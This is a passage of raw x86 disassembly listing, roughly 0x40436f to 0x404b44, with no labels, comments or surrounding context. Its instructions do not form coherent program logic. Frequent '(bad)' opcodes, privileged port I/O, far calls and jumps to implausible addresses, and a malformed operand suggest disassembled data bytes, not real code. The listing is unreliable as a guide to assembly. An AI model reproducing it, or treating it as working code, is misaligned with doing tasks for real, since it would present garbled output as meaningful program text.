  40436f:	jecxz  0x40438d
  404371:	and    DWORD PTR [ebx],esi
  404373:	mov    cl,0x1b
  404375:	mov    edi,0x2d5552f7
  40437a:	mov    cl,0x3c
  40437d:	add    ebx,DWORD PTR [ebx-0x8]
  404380:	dec    ebx
  404381:	mov    dl,0x30
  404383:	(bad)  
  404384:	out    0x32,al
  404386:	mov    ebx,0xd272b1c1
  40438b:	push   ebx
  40438c:	pop    edi
  40438d:	adc    eax,0x8ef1d7cc
  404392:	(bad)  
  404394:	cdq    
  404395:	cmp    al,0x1e
  404397:	popa   
  404398:	cs scas eax,DWORD PTR es:[di]
  40439b:	pop    ss
  40439c:	fld    st(0)
  40439e:	mov    DWORD PTR [ebp+0x5ab1a17a],edi
  4043a4:	xchg   esi,eax
  4043a5:	sbb    al,0x99
  4043a7:	push   0x5d
  4043a9:	push   ebp
  4043aa:	mov    edx,0x3b5f0222
  4043af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043b0:	push   ebp
  4043b1:	mov    edi,0x5319a58c
  4043b6:	jge    0x404391
  4043b8:	push   0x29
  4043ba:	fs jg  0x4043e2
  4043bd:	lock rol BYTE PTR [esi-0x38],cl
  4043c1:	test   al,0xc3
  4043c3:	ja     0x404364
  4043c5:	out    dx,al
  4043c6:	out    0xe3,eax
  4043c8:	out    dx,eax
  4043c9:	add    al,0x25
  4043cb:	fldenv [edx+0xf616f76]
  4043d1:	xor    eax,0xe53c2c77
  4043d6:	mov    ecx,0x1c2d08e6
  4043db:	popa   
  4043dc:	jmp    0xe7eb24ed
  4043e1:	mov    ah,0xbe
  4043e3:	xchg   DWORD PTR [eax],esi
  4043e5:	and    BYTE PTR [ebx+0x32f13185],0x6f
  4043ec:	(bad)  
  4043ed:	ds push 0xffffffbb
  4043f0:	push   ebx
  4043f1:	adc    ah,BYTE PTR [edx-0x16dcec24]
  4043f7:	or     esi,DWORD PTR [eax]
  4043f9:	mov    eax,0x3fbb3a04
  4043fe:	pop    ecx
  4043ff:	jo     0x4043bb
  404401:	xor    edx,ebp
  404403:	pusha  
  404404:	in     eax,0x91
  404406:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404407:	ss dec eax
  404409:	stos   BYTE PTR es:[edi],al
  40440a:	in     al,dx
  40440b:	popa   
  40440c:	lea    ebp,[edi+0x1a]
  40440f:	aas    
  404410:	sub    eax,0x472f6158
  404415:	pop    ebx
  404416:	pushf  
  404417:	call   0x642b:0x8e49087c
  40441e:	mov    dl,ah
  404420:	push   ss
  404421:	jp     0x404463
  404423:	mov    edi,0xa8dc8c92
  404428:	arpl   WORD PTR [edx],cx
  40442a:	(bad)  
  40442b:	es mov eax,0xc93e81f0
  404431:	or     BYTE PTR [edx+0x5f215577],dh
  404437:	dec    edi
  404438:	sar    dh,cl
  40443a:	push   ebx
  40443b:	arpl   di,dx
  40443d:	nop
  40443e:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  404440:	xor    al,0xcf
  404442:	mov    ds:0xf49ff65e,eax
  404447:	sub    eax,0x770b59e1
  40444c:	loope  0x404450
  40444e:	push   edi
  40444f:	call   0x93a383bc
  404454:	aad    0xdc
  404456:	xchg   ecx,eax
  404457:	adc    ecx,DWORD PTR [ebx-0x1084b43a]
  40445d:	pop    esp
  40445e:	mov    eax,db0
  404461:	sti    
  404462:	and    ebx,DWORD PTR [ebx+0x26]
  404465:	add    eax,0xd914ea45
  40446a:	sti    
  40446b:	fadd   QWORD PTR [esi+0x226d6403]
  404471:	out    dx,al
  404472:	pop    ds
  404473:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404474:	xor    DWORD PTR [esi+0x281fc560],0xffffffeb
  40447b:	enter  0x3faf,0x8c
  40447f:	inc    ebx
  404480:	mov    eax,ds:0xf778a2ed
  404485:	cmp    bh,dh
  404487:	pop    ecx
  404488:	ss cwde 
  40448a:	pusha  
  40448b:	test   eax,0xf10d3a60
  404490:	pop    ecx
  404491:	into   
  404492:	mov    ebx,0xd1c1cc32
  404497:	mov    edx,0xbe00806c
  40449c:	xor    DWORD PTR [esi+0xc],0x21
  4044a0:	push   ebp
  4044a1:	enter  0x7bbb,0x45
  4044a5:	mov    ah,0x40
  4044a7:	retf   0xf42
  4044aa:	dec    eax
  4044ab:	jmp    0x40445e
  4044ad:	xchg   esi,eax
  4044ae:	add    DWORD PTR [edi],esp
  4044b0:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4044b2:	push   esi
  4044b3:	and    eax,0x48edd467
  4044b8:	pop    ds
  4044b9:	cmp    edx,DWORD PTR [esi]
  4044bb:	or     eax,0x6b53479a
  4044c0:	imul   ebx,DWORD PTR [edx],0x75
  4044c3:	aad    0x7
  4044c5:	push   ebp
  4044c6:	mov    edx,0x5392001
  4044cb:	int    0xed
  4044cd:	mov    ds:0x35cde1a5,al
  4044d2:	pop    esi
  4044d3:	jae    0x404541
  4044d5:	(bad)  
  4044d6:	sbb    eax,0x93e46842
  4044db:	mov    eax,0xe85e0ec1
  4044e0:	adc    dh,bl
  4044e2:	xchg   BYTE PTR [edi-0x16],dl
  4044e5:	cli    
  4044e6:	cld    
  4044e7:	mov    esp,0xb207495c
  4044ec:	scas   al,BYTE PTR es:[edi]
  4044ed:	lods   eax,DWORD PTR ds:[esi]
  4044ee:	stc    
  4044ef:	and    ecx,ebx
  4044f1:	pop    ecx
  4044f2:	sub    al,0x17
  4044f4:	mov    esi,0x13117bab
  4044f9:	arpl   ax,cx
  4044fb:	stos   DWORD PTR es:[edi],eax
  4044fc:	rcl    ah,1
  4044fe:	or     eax,0xcc373320
  404503:	jg     0x4044ce
  404505:	sbb    ecx,DWORD PTR [eax-0x14]
  404508:	(bad)  
  404509:	nop
  40450a:	cmp    esp,DWORD PTR [ebx-0x59]
  40450d:	mov    ecx,0xe9d72eb9
  404512:	dec    eax
  404513:	dec    ebx
  404514:	pop    ebp
  404515:	push   es
  404516:	scas   al,BYTE PTR es:[edi]
  404517:	pop    edx
  404518:	lods   eax,DWORD PTR ds:[esi]
  404519:	mov    esi,0xf99cdc22
  40451e:	pop    edx
  40451f:	inc    esp
  404520:	imul   esi,DWORD PTR [edx+0x6c43fc69],0xfed58c45
  40452a:	hlt    
  40452b:	or     al,0x39
  40452d:	mov    bl,bl
  40452f:	bound  ecx,QWORD PTR [ebx+0x4cc797c3]
  404535:	push   0xffffff9a
  404537:	clc    
  404538:	retf   0x7851
  40453b:	(bad)  
  40453c:	(bad)  
  40453d:	fld    QWORD PTR [ecx-0x4bc50714]
  404543:	aas    
  404544:	jl     0x4044e4
  404546:	jo     0x4044fb
  404548:	sahf   
  404549:	ja     0x404512
  40454b:	and    eax,0x9130689c
  404550:	jno    0x4044f5
  404552:	fwait
  404553:	retf   0x4cc
  404556:	xor    ah,al
  404558:	mov    eax,ds:0xf6a1285e
  40455d:	push   ds
  40455e:	mov    ebp,0xce7071da
  404563:	xor    BYTE PTR [ecx+0x79],al
  404566:	add    DWORD PTR fs:[edx-0x5de2fa21],esp
  40456d:	and    al,0xdf
  40456f:	fadd   st,st(7)
  404571:	sub    DWORD PTR [edi-0x5c],ecx
  404574:	out    0x24,eax
  404576:	xchg   ebx,eax
  404577:	jo     0x4045f8
  404579:	aad    0x50
  40457b:	pop    ebx
  40457d:	pop    ecx
  40457e:	mov    dh,0xe1
  404580:	rep lods al,BYTE PTR ds:[esi]
  404582:	cmp    ebx,DWORD PTR [ebp-0x8]
  404585:	pop    ebx
  404586:	adc    eax,0xc9f1eb13
  40458b:	ins    DWORD PTR es:[edi],dx
  40458c:	and    al,0x61
  40458e:	rcl    edx,1
  404590:	cmp    al,0xd6
  404592:	mov    DWORD PTR gs:[edi-0x2f],eax
  404596:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404597:	xchg   ebp,eax
  404598:	sti    
  404599:	rol    DWORD PTR [edi+0x32e32ead],1
  40459f:	or     al,0x28
  4045a1:	xchg   edx,eax
  4045a2:	inc    esi
  4045a3:	cmp    BYTE PTR [eax+0x5f22a9c],al
  4045a9:	pop    edx
  4045aa:	test   ch,0x30
  4045ad:	fldenv [edx]
  4045af:	gs dec edi
  4045b1:	push   ebp
  4045b2:	je     0x40462a
  4045b4:	sbb    ecx,0xffffff93
  4045b7:	mov    esp,eax
  4045b9:	dec    esi
  4045ba:	mov    ?,WORD PTR [edx+eax*4-0x7b4b536e]
  4045c1:	enter  0xb6a9,0xa0
  4045c5:	jge    0x40457d
  4045c7:	fcom   QWORD PTR [ecx-0x2b]
  4045ca:	outs   dx,DWORD PTR ds:[esi]
  4045cb:	and    BYTE PTR [eax+0x7b67a363],al
  4045d1:	(bad)  
  4045d3:	nop
  4045d4:	mov    dh,0xe2
  4045d6:	int    0x38
  4045d8:	jb     0x404653
  4045da:	fsub   DWORD PTR [edi+0x16]
  4045dd:	fmul   QWORD PTR [ebx+ebp*8-0x55]
  4045e1:	aad    0xc1
  4045e3:	jo     0x40458e
  4045e5:	es mov bh,0x90
  4045e8:	mov    eax,ds:0x9325fcf1
  4045ed:	fxam   
  4045ef:	sub    eax,0xfe73a7f7
  4045f4:	adc    ecx,ebx
  4045f6:	mov    ecx,0x6f40845a
  4045fb:	arpl   dx,di
  4045fd:	jbe    0x40459d
  4045ff:	(bad)  
  404600:	std    
  404601:	aam    0xc0
  404603:	add    al,0x74
  404605:	daa    
  404606:	mov    ds:0x339a724,eax
  40460b:	rol    BYTE PTR [ecx],1
  40460d:	dec    edi
  40460e:	in     eax,dx
  40460f:	fmul   st(5),st
  404611:	jne    0x4045ac
  404613:	inc    ecx
  404614:	(bad)  
  404615:	das    
  404616:	xchg   edx,eax
  404617:	lods   al,BYTE PTR ds:[esi]
  404618:	and    eax,0x3fbe77df
  40461d:	jp     0x4045e1
  40461f:	out    dx,eax
  404620:	ror    DWORD PTR [edi-0x9376f96],cl
  404626:	or     BYTE PTR [ebp-0x1003db1d],0xa
  40462d:	enter  0xc0e5,0x7b
  404631:	clc    
  404632:	mov    bl,BYTE PTR [ecx-0x32b036ae]
  404638:	push   esp
  404639:	aad    0xa4
  40463b:	push   edx
  40463c:	nop
  40463d:	ins    BYTE PTR es:[edi],dx
  40463e:	dec    eax
  40463f:	push   cs
  404640:	int3   
  404641:	aas    
  404642:	adc    al,0x40
  404644:	mov    dh,0xea
  404646:	xchg   edx,eax
  404647:	mov    ecx,0x58ea0160
  40464c:	adc    edi,eax
  40464e:	xor    al,0xb0
  404650:	call   0x96f7:0xc5eb5e75
  404657:	jmp    0x404617
  404659:	fcomp  st(3)
  40465b:	and    ah,al
  40465d:	or     bl,BYTE PTR [eax+ebx*1]
  404660:	cmp    eax,0x8a18f6aa
  404665:	add    DWORD PTR [ebx],edi
  404667:	mov    al,ds:0x9888d76b
  40466c:	mov    eax,0x2404a5e0
  404671:	push   cs
  404672:	mov    ds:0x9f51eb1f,eax
  404677:	mov    ds:0x9630373b,al
  40467c:	mov    ss,WORD PTR [edi]
  40467e:	int3   
  40467f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404680:	add    BYTE PTR [eax],bh
  404682:	frstor [edx-0x7a]
  404685:	int    0xbb
  404687:	mov    eax,0xa9115cc9
  40468c:	test   DWORD PTR [eax+0x41],ecx
  40468f:	fwait
  404690:	lea    esp,[eax-0x5c928d9]
  404696:	push   es
  404697:	ds scas al,BYTE PTR es:[edi]
  404699:	stos   DWORD PTR es:[edi],eax
  40469a:	jecxz  0x4046e5
  40469c:	cmp    eax,0x1604e423
  4046a1:	fsubr  QWORD PTR [ecx-0x7207ee1d]
  4046a7:	push   esp
  4046a8:	ja     0x404681
  4046aa:	clc    
  4046ab:	mov    ds:0x10ef4692,al
  4046b0:	daa    
  4046b1:	sbb    esp,edx
  4046b3:	stos   DWORD PTR es:[edi],eax
  4046b4:	xchg   ebp,eax
  4046b5:	sub    eax,0x46904a04
  4046ba:	push   es
  4046bb:	jae    0x4046e0
  4046bd:	ins    BYTE PTR es:[edi],dx
  4046be:	pushf  
  4046bf:	push   edi
  4046c0:	mov    eax,ds:0x57de17a8
  4046c5:	loopne 0x40471c
  4046c7:	mov    ds:0xe978e5c0,eax
  4046cc:	xchg   edi,eax
  4046cd:	xor    DWORD PTR [edi],esp
  4046cf:	stc    
  4046d0:	pop    ebp
  4046d1:	jnp    0x404715
  4046d3:	(bad)  
  4046d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046d5:	stc    
  4046d6:	ins    BYTE PTR es:[edi],dx
  4046d7:	push   es
  4046d8:	sbb    BYTE PTR [ebx-0x51],al
  4046db:	xchg   esi,eax
  4046dc:	out    0x5a,eax
  4046de:	sbb    DWORD PTR [edi+0x7ae6c15b],edx
  4046e4:	mov    ds:0x4357f79d,al
  4046e9:	(bad)  
  4046ea:	pop    ss
  4046eb:	vrcpss xmm2,xmm5,DWORD PTR [esi]
  4046ef:	and    al,0xf1
  4046f1:	or     BYTE PTR [ebx-0x7b],ah
  4046f4:	lea    eax,[esi*1-0x6e4b35b7]
  4046fb:	jmp    0x40468e
  4046fd:	mov    bl,0x83
  4046ff:	jmp    0x68123c2d
  404704:	sub    BYTE PTR [eax-0x75],ch
  404707:	xchg   ebx,eax
  404708:	dec    ebx
  404709:	inc    ebx
  40470a:	fst    DWORD PTR [ebp-0x744a5a8]
  404710:	sbb    BYTE PTR [ecx+0x6d],dh
  404713:	loope  0x4046bc
  404715:	call   0x43fc:0xd5dd00a3
  40471c:	inc    ebp
  40471d:	or     DWORD PTR [edi+0x242ed5b5],ebx
  404723:	out    dx,al
  404724:	xchg   ebx,eax
  404725:	ins    BYTE PTR es:[edi],dx
  404726:	xor    ah,BYTE PTR [edx-0xc6d3530]
  40472c:	xchg   BYTE PTR [ecx*2-0x377ec5dd],bh
  404733:	mov    esi,0x99a5f2da
  404738:	sub    DWORD PTR [edx+ebx*1],ebp
  40473b:	mov    ds:0xd446e9ba,eax
  404740:	push   ecx
  404741:	leave  
  404742:	sbb    ch,BYTE PTR [esi-0x6415f90f]
  404748:	cwde   
  404749:	sbb    eax,0x2f73e1b9
  40474e:	mov    es,WORD PTR [ebp-0x2237a14]
  404754:	fistp  WORD PTR [edi]
  404756:	loopne 0x404729
  404758:	repnz out dx,al
  40475a:	aad    0x7
  40475c:	mov    eax,0xc8394070
  404761:	mov    al,0x84
  404763:	jmp    0x404758
  404765:	ret    
  404766:	mov    esi,0x604df9a
  40476b:	outs   dx,DWORD PTR ds:[esi]
  40476c:	call   0xedb4d3b5
  404771:	imul   edi,DWORD PTR [ecx],0x17
  404774:	mov    cl,0xc3
  404776:	fucomp st(5)
  404778:	sub    BYTE PTR [ecx-0x36],bh
  40477b:	xor    DWORD PTR [ebp-0x18],edx
  40477e:	scas   eax,DWORD PTR es:[edi]
  40477f:	sbb    BYTE PTR [edi-0x405d62d7],bh
  404785:	cbw    
  404787:	(bad)  
  404788:	mov    edx,0x851a60e4
  40478d:	(bad)  
  40478e:	in     eax,dx
  40478f:	cdq    
  404790:	xchg   ebp,eax
  404791:	arpl   WORD PTR [eax+edx*8+0x55641cb4],dx
  404798:	jb     0x40472b
  40479a:	mov    ecx,DWORD PTR [esp+esi*1-0x53]
  40479e:	fdivr  DWORD PTR [esi]
  4047a0:	scas   al,BYTE PTR es:[edi]
  4047a1:	cmp    al,0x18
  4047a3:	clc    
  4047a4:	popf   
  4047a5:	fiadd  DWORD PTR ss:[ebp+0x302dc7e9]
  4047ac:	jecxz  0x404767
  4047ae:	popf   
  4047af:	popf   
  4047b0:	out    dx,eax
  4047b1:	jno    0x40480a
  4047b3:	loopne 0x4047e4
  4047b5:	cmc    
  4047b6:	icebp  
  4047b7:	sahf   
  4047b8:	scas   al,BYTE PTR es:[edi]
  4047b9:	ins    BYTE PTR es:[edi],dx
  4047ba:	xchg   ebx,eax
  4047bb:	inc    ebx
  4047bc:	lds    edx,FWORD PTR [edi+edi*8+0x38]
  4047c0:	adc    al,0x2f
  4047c2:	dec    ebp
  4047c3:	test   eax,0x2fb0d51f
  4047c8:	fld    DWORD PTR [edx+0x77]
  4047cb:	les    esp,FWORD PTR [eax]
  4047cd:	idiv   BYTE PTR [esp+edi*8-0x13]
  4047d1:	inc    esp
  4047d2:	jne    0x40478f
  4047d4:	rcl    BYTE PTR [ecx],cl
  4047d6:	iret   
  4047d7:	push   0xffffffa5
  4047d9:	jl     0x404798
  4047db:	jecxz  0x4047e5
  4047dd:	cmp    eax,0x71d9c6d8
  4047e2:	aad    0x95
  4047e4:	ja     0x4047b9
  4047e6:	mov    bl,0x8e
  4047e8:	pop    ebx
  4047e9:	in     eax,dx
  4047ea:	inc    eax
  4047eb:	xchg   ecx,eax
  4047ec:	xor    dl,ch
  4047ee:	sti    
  4047ef:	(bad)  
  4047f0:	into   
  4047f1:	dec    edx
  4047f2:	pop    ecx
  4047f3:	adc    DWORD PTR [esi+0x4e],0x89f6790e
  4047fa:	sbb    esp,edi
  4047fc:	xlat   BYTE PTR ds:[ebx]
  4047fd:	pop    ss
  4047fe:	loopne 0x4047d3
  404800:	loope  0x40480c
  404802:	repnz rol dl,1
  404805:	es sti 
  404807:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404808:	scas   al,BYTE PTR es:[edi]
  404809:	cmp    ah,BYTE PTR [edi-0x3b]
  40480c:	push   ecx
  40480d:	out    dx,al
  40480e:	shl    DWORD PTR [edi],cl
  404810:	jbe    0x40488a
  404812:	mov    ecx,0xde660be6
  404817:	xchg   DWORD PTR [ebx+0x5b149d1e],esp
  40481d:	sub    al,0xf9
  40481f:	lahf   
  404820:	ret    0xa62
  404823:	mov    ch,0xed
  404825:	mov    ch,0x7e
  404827:	xor    eax,0x76ea0345
  40482c:	aad    0x29
  40482e:	aam    0x9c
  404830:	lock cmc 
  404832:	cmp    ebx,ebp
  404834:	cmp    cl,BYTE PTR [esi-0xb2cb4a8]
  40483a:	pop    esi
  40483b:	popa   
  40483c:	rol    BYTE PTR [edx],1
  40483e:	and    al,0xf
  404840:	dec    esp
  404841:	int    0x78
  404843:	jmp    0x4a89:0x157e40af
  40484a:	pop    edx
  40484b:	sbb    eax,0xdca2850
  404850:	inc    ebp
  404851:	loopne 0x4048ab
  404853:	leave  
  404854:	hlt    
  404855:	xlat   BYTE PTR ds:[ebx]
  404856:	xor    DWORD PTR [ebp+0x76],eax
  404859:	lahf   
  40485a:	bound  edx,QWORD PTR [esi]
  40485c:	fwait
  40485d:	adc    edx,DWORD PTR [eax+edx*4+0x2f]
  404861:	jno    0x4048c8
  404863:	call   ebx
  404865:	es cmc 
  404867:	inc    ecx
  404868:	cmc    
  404869:	js     0x404881
  40486b:	jp     0x4048c4
  40486d:	mov    al,ds:0x2213703b
  404872:	popw   ss
  404874:	stos   BYTE PTR es:[edi],al
  404875:	add    al,0xb2
  404877:	cwde   
  404878:	jp     0x4048b7
  40487a:	push   ss
  40487b:	xchg   esi,eax
  40487c:	in     al,0x4e
  40487e:	mov    edx,0x7f5cf443
  404883:	inc    edi
  404884:	sub    eax,0x3a4d3fb2
  404889:	les    ecx,FWORD PTR [eax-0x18]
  40488c:	sub    dl,BYTE PTR [edi+0x5dfdf138]
  404892:	or     DWORD PTR [edx-0x6931a0a6],edi
  404898:	rcl    BYTE PTR [eax],cl
  40489a:	js     0x404896
  40489c:	push   cs
  40489d:	fcom   QWORD PTR [ebx-0x71]
  4048a0:	pop    ebp
  4048a1:	mov    ch,0x70
  4048a3:	imul   eax,edx,0xff8e9c7c
  4048a9:	test   al,0xc5
  4048ab:	jge    0x404906
  4048ad:	(bad)  
  4048ae:	xor    edx,ebp
  4048b0:	shl    DWORD PTR [ebp-0x11],cl
  4048b3:	jl     0x404871
  4048b5:	push   esi
  4048b6:	(bad)  
  4048b7:	(bad)  
  4048b8:	jmp    0x8df32ea7
  4048bd:	das    
  4048be:	jecxz  0x4048cd
  4048c0:	(bad)  
  4048c1:	jmp    0x40492d
  4048c3:	bound  esp,QWORD PTR [eax-0x40]
  4048c6:	stos   DWORD PTR es:[edi],eax
  4048c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048c8:	mov    al,ds:0x44871a12
  4048cd:	pop    ebp
  4048ce:	scas   al,BYTE PTR es:[edi]
  4048cf:	jmp    0x4048cb
  4048d1:	or     bl,cl
  4048d3:	je     0x404896
  4048d5:	sahf   
  4048d6:	and    DWORD PTR [edi+0x5b6559d5],edx
  4048dc:	add    dl,BYTE PTR [eax]
  4048de:	xor    BYTE PTR [ecx+0x19],dl
  4048e1:	and    eax,0x7b4351cb
  4048e6:	in     al,dx
  4048e7:	out    dx,eax
  4048e8:	sbb    DWORD PTR [edx+0x157d5cc4],edi
  4048ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048ef:	scas   al,BYTE PTR es:[edi]
  4048f0:	into   
  4048f1:	dec    edx
  4048f2:	pusha  
  4048f3:	adc    al,0xc6
  4048f5:	in     al,0x45
  4048f7:	loope  0x4048dd
  4048f9:	adc    esp,DWORD PTR [edi+ebp*8-0x48300607]
  404900:	mov    DWORD PTR [eax+0x74c163ed],eax
  404906:	jl     0x404896
  404908:	add    ah,BYTE PTR [edi]
  40490a:	cmp    BYTE PTR [esi],cl
  40490c:	jge    0x404956
  40490e:	shl    DWORD PTR [ebx],0x79
  404911:	cmp    al,BYTE PTR [ecx-0x125b2863]
  404917:	jno    0x4048b2
  404919:	gs mov esi,0xf83ac2c3
  40491f:	or     bh,ch
  404921:	int    0xd9
  404923:	outs   dx,DWORD PTR ds:[esi]
  404924:	shl    DWORD PTR [edi],0xa6
  404927:	stos   BYTE PTR es:[edi],al
  404928:	pop    eax
  404929:	into   
  40492a:	lock push ss
  40492c:	repnz mov WORD PTR [esi+0x66],cs
  404930:	aam    0x89
  404932:	lds    esp,FWORD PTR [ebx+0x45300d94]
  404938:	sahf   
  404939:	in     al,dx
  40493a:	mov    ds:0x66221cb0,al
  40493f:	adc    BYTE PTR [edx+esi*1+0x234356c1],ah
  404946:	retf   
  404947:	outs   dx,BYTE PTR ds:[esi]
  404948:	inc    esp
  404949:	dec    edi
  40494a:	hlt    
  40494b:	rcl    BYTE PTR [ebp-0x65],1
  40494e:	popa   
  40494f:	add    esi,edi
  404951:	sub    eax,0xda2be9b3
  404956:	(bad)  [esi+0x69]
  404959:	cli    
  40495a:	enter  0xa15a,0x1d
  40495e:	mov    cl,BYTE PTR ds:0x21dd5423
  404964:	mov    ch,0x53
  404966:	sbb    BYTE PTR [ebx],ah
  404968:	rcr    DWORD PTR [ecx-0x548d0904],0xb5
  40496f:	dec    esp
  404970:	mov    ds:0x7da82cec,al
  404975:	loop   0x4049d7
  404977:	std    
  404978:	adc    al,0x3d
  40497a:	jecxz  0x40492b
  40497c:	pop    edi
  40497d:	jb     0x4049d7
  40497f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404980:	dec    ecx
  404981:	mov    edx,0xf34d2678
  404986:	loope  0x4049f1
  404988:	std    
  404989:	lods   eax,DWORD PTR ds:[esi]
  40498a:	sahf   
  40498b:	cmp    eax,0xd79899c
  404990:	les    edi,FWORD PTR [ecx+0x38]
  404993:	jmp    0x95a44a02
  404998:	jle    0x4049e4
  40499a:	fs xchg edi,eax
  40499c:	(bad)  
  40499e:	je     0x404947
  4049a0:	sub    eax,0x65949f93
  4049a5:	dec    esp
  4049a6:	test   DWORD PTR [ebx+ecx*8+0x7a619e36],eax
  4049ad:	push   0x9fdc7538
  4049b2:	inc    eax
  4049b3:	mov    al,ds:0xa0f321b0
  4049b8:	or     BYTE PTR ds:0xb7a32090,ah
  4049be:	xor    BYTE PTR [edx],dh
  4049c0:	mov    ds:0x44cda267,eax
  4049c5:	rcl    al,0x3c
  4049c8:	mov    edx,0x7b295509
  4049cd:	nop
  4049ce:	(bad)  
  4049cf:	scas   al,BYTE PTR es:[edi]
  4049d0:	leave  
  4049d1:	int3   
  4049d2:	popf   
  4049d3:	stc    
  4049d4:	mov    BYTE PTR [esi-0xdde3148],al
  4049da:	popf   
  4049db:	es xor eax,0x59476f3b
  4049e1:	add    eax,0xb69bb984
  4049e6:	pop    ebx
  4049e7:	or     ah,bl
  4049e9:	dec    bh
  4049eb:	stos   BYTE PTR es:[edi],al
  4049ec:	enter  0x65a1,0xad
  4049f0:	aad    0xc
  4049f2:	fisub  DWORD PTR [esi]
  4049f4:	pop    eax
  4049f5:	mov    edx,0x119a0089
  4049fa:	mov    eax,ds:0x17530180
  4049ff:	leave  
  404a00:	jbe    0x404a17
  404a02:	add    ebx,DWORD PTR [esp+eax*8]
  404a05:	ins    DWORD PTR es:[edi],dx
  404a06:	scas   eax,DWORD PTR es:[edi]
  404a07:	sub    edi,ebp
  404a09:	xlat   BYTE PTR ds:[ebx]
  404a0a:	sbb    ebp,ecx
  404a0c:	imul   edx,DWORD PTR [edx],0xffffff9a
  404a0f:	mov    al,ds:0x249254a2
  404a14:	mov    DWORD PTR [ebp+0xf],ebp
  404a17:	push   ss
  404a18:	add    BYTE PTR [edx+0x87fda01],bh
  404a1e:	mov    BYTE PTR [ebx+0x7bb43d7],al
  404a24:	or     BYTE PTR [ebx-0x6ed1aacd],dl
  404a2a:	ror    DWORD PTR [eax],0x3f
  404a2d:	adc    ebx,DWORD PTR [ebp-0x53]
  404a30:	stos   BYTE PTR es:[edi],al
  404a31:	or     ebp,esp
  404a33:	push   ebx
  404a34:	mov    edx,0x4b669d8b
  404a39:	in     al,0xef
  404a3b:	imul   ebp,DWORD PTR [edx-0x139fca4f],0x258323e
  404a45:	rol    ebx,cl
  404a47:	and    BYTE PTR [edi-0x75a396a8],bh
  404a4d:	aam    0xfe
  404a4f:	xchg   esp,eax
  404a50:	push   ebp
  404a51:	inc    ebp
  404a52:	pop    edi
  404a53:	cmp    ch,BYTE PTR ss:[ebx]
  404a56:	cdq    
  404a57:	xchg   ebp,eax
  404a58:	addr16 mov ch,0xa3
  404a5b:	inc    ecx
  404a5c:	pop    edi
  404a5d:	and    DWORD PTR [ebp-0x6e],esp
  404a60:	ret    
  404a61:	addr16 dec eax
  404a63:	stos   BYTE PTR es:[edi],al
  404a64:	out    0x9b,eax
  404a66:	arpl   di,bp
  404a68:	and    al,0xa2
  404a6a:	outs   dx,DWORD PTR ds:[esi]
  404a6b:	push   es
  404a6c:	push   ds
  404a6d:	sub    BYTE PTR [edx+0x38],ah
  404a70:	call   0x714faabb
  404a75:	push   ebp
  404a76:	pushf  
  404a77:	add    esi,edi
  404a79:	ins    BYTE PTR es:[edi],dx
  404a7a:	cmp    eax,0x94ce2233
  404a7f:	les    edi,FWORD PTR [ebx]
  404a81:	ja     0x404a33
  404a83:	scas   al,BYTE PTR es:[edi]
  404a84:	push   eax
  404a85:	pop    esi
  404a86:	adc    eax,0xaa29b55
  404a8b:	cmp    eax,DWORD PTR [ecx+esi*8-0x38]
  404a8f:	mov    dh,0xf5
  404a91:	mov    ch,0xae
  404a93:	cmp    bh,ch
  404a95:	and    eax,edi
  404a97:	sbb    ecx,DWORD PTR [edi]
  404a99:	mov    al,0x17
  404a9b:	and    DWORD PTR [ebx],esi
  404a9d:	(bad)  
  404a9e:	xor    BYTE PTR [edx-0x54],bl
  404aa1:	gs retf 
  404aa3:	dec    esi
  404aa4:	push   ds
  404aa5:	mov    al,ds:0x29cac1ff
  404aaa:	(bad)  
  404aab:	or     al,0x82
  404aad:	stc    
  404aae:	jae    0x404a71
  404ab0:	xchg   ebp,eax
  404ab1:	cmp    ebx,esp
  404ab3:	and    eax,0xa2522bc4
  404ab8:	dec    ebx
  404ab9:	bound  esp,QWORD PTR [edx+esi*1+0x1e]
  404abd:	xchg   ecx,eax
  404abe:	pop    esi
  404abf:	sub    al,0x19
  404ac1:	lahf   
  404ac2:	inc    edx
  404ac3:	enter  0x427b,0x1e
  404ac7:	dec    esi
  404ac8:	adc    al,0x99
  404aca:	or     eax,esi
  404acc:	loop   0x404afa
  404ace:	mov    edx,0x2cdce52a
  404ad3:	adc    ch,dh
  404ad5:	push   edx
  404ad6:	scas   eax,DWORD PTR es:[edi]
  404ad7:	dec    edi
  404ad8:	sbb    BYTE PTR [ebx],ch
  404ada:	jae    0x404ae4
  404adc:	data16 add BYTE PTR [esi+0x6113f295],ah
  404ae3:	iret   
  404ae4:	xchg   ebx,ecx
  404ae6:	xchg   ebp,eax
  404ae7:	mov    edi,0xa4df4216
  404aec:	shl    DWORD PTR [ebx],1
  404aee:	jne    0x404b19
  404af0:	not    BYTE PTR [esi]
  404af2:	aad    0x28
  404af4:	(bad)  
  404af5:	int    0xf6
  404af7:	jmp    0x138b8671
  404afc:	es in  al,dx
  404afe:	fwait
  404aff:	add    DWORD PTR [esi-0x7],0xfd28c73d
  404b06:	adc    al,0xc2
  404b08:	pop    ebp
  404b09:	add    eax,0xe58cd767
  404b0e:	aaa    
  404b0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b10:	addr16 or eax,0x80a9f3c2
  404b16:	sub    eax,0x2ea20eaf
  404b1b:	pop    eax
  404b1c:	xlat   BYTE PTR ds:[ebx]
  404b1d:	jmp    0xb46b7179
  404b22:	lock cmp ch,BYTE PTR [edx-0x2f]
  404b26:	mov    dl,BYTE PTR [ebx-0x38]
  404b29:	xchg   edx,eax
  404b2a:	lahf   
  404b2b:	(bad)  
  404b2c:	sub    DWORD PTR [ebx+0x320d87d0],eax
  404b32:	lahf   
  404b33:	adc    al,0xff
  404b35:	xchg   edi,eax
  404b36:	sbb    ch,BYTE PTR [edx+esi*1+0xd]
  404b3a:	fs daa 
  404b3c:	cmc    
  404b3d:	mov    edi,0x564f9c47
  404b42:	pop    ds
  404b43:	cli    
  404b44:	xchg   edi,eax
